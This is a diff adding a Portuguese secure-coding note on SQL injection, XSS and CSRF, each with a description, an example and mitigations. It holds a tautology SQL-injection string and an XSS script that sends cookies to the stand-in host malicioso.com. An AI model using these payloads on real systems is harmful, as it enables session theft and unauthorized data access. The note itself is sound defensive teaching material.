@@ -1,0 +1,45 @@
+1. Injeção de SQL (SQL Injection)
+Descrição:
+Esse ataque ocorre quando comandos SQL maliciosos são inseridos em campos de entrada da aplicação, com o objetivo de manipular o banco de dados. Pode permitir ao invasor visualizar, modificar ou até deletar dados.
+
+Exemplo:  SELECT * FROM usuarios WHERE email = 'malicioso@exemplo.com' OR '1'='1';
+
+sql
+Copiar
+Editar
+SELECT * FROM usuarios WHERE email = 'malicioso@exemplo.com' OR '1'='1';
+Mitigação:
+Use consultas parametrizadas/preparadas (prepared statements), evitando concatenar strings SQL com entradas do usuário.
+Validação de entrada: Rejeitar caracteres e padrões perigosos.
+Menor privilégio: O usuário do banco de dados deve ter apenas as permissões necessárias.
+
+2. Cross-Site Scripting (XSS)
+Descrição:
+Ocorre quando scripts maliciosos (geralmente JavaScript) são injetados em páginas visualizadas por outros usuários. Isso pode ser usado para roubar cookies, redirecionar usuários ou manipular a interface.
+
+Exemplo:  <script>document.location='http://malicioso.com?cookie=' + document.cookie</script>
+
+html
+Copiar
+Editar
+<script>document.location='http://malicioso.com?cookie=' + document.cookie</script>
+Mitigação:
+
+Escapar/neutralizar o conteúdo de entrada antes de exibi-lo no HTML.
+Validação de entrada rigorosa, especialmente para campos que aceitam texto rico.
+Uso de Content Security Policy (CSP) para limitar os scripts que podem ser executados.
+
+3. Cross-Site Request Forgery (CSRF)
+Descrição:
+Esse ataque engana um usuário autenticado a executar ações indesejadas em um site no qual está autenticado (como alterar senha ou fazer uma transferência), geralmente através de um link ou formulário forjado.
+
+Exemplo:
+Um site malicioso envia uma requisição POST para http://banco.com/transferir?valor=1000&para=ataque.
+
+Mitigação:
+
+Tokens CSRF: Incluir um token único e secreto em formulários que só pode ser enviado pela aplicação original.
+
+Verificação de origem (referer/origin header) para garantir que a requisição vem do mesmo site.
+
+Requisições sensíveis via métodos seguros (ex: POST) e não GET.
